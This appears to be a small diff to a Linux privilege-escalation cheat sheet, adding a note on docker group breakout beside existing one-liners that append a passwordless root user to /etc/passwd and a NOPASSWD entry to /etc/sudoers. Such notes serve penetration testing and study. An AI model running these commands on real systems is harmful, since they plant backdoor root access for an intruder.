@@ -9,6 +9,7 @@
 - `echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
 - `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`<br>
 - `groups`<br>
+    - `docker` (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
 
 https://gtfobins.github.io/<br>
 <hr>
